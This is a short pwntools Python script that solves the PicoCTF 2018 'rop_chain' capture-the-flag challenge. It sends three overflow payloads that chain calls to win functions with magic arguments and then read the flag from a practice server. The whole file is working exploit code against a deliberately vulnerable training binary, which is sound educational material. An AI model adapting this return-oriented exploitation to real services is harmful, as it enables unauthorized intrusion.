from pwn import *

context.log_level = "debug"

exe = ELF("./PicoCTF_2018_rop_chain")
# r = exe.process()
# gdb.attach(r)
r = remote("node4.buuoj.cn", 29283)

payload = cyclic(28) + p32(exe.sym["win_function1"]) + p32(exe.sym["vuln"])
r.recvuntil(b"Enter your input> ")
r.sendline(payload)
payload = (
    cyclic(28) + p32(exe.sym["win_function2"]) + p32(exe.sym["vuln"]) + p32(0xBAAAAAAD)
)
r.recvuntil(b"Enter your input> ")
r.sendline(payload)
payload = cyclic(28) + p32(exe.sym["flag"]) + p32(0) + p32(0xDEADBAAD)
r.recvuntil(b"Enter your input> ")
r.sendline(payload)
r.interactive()
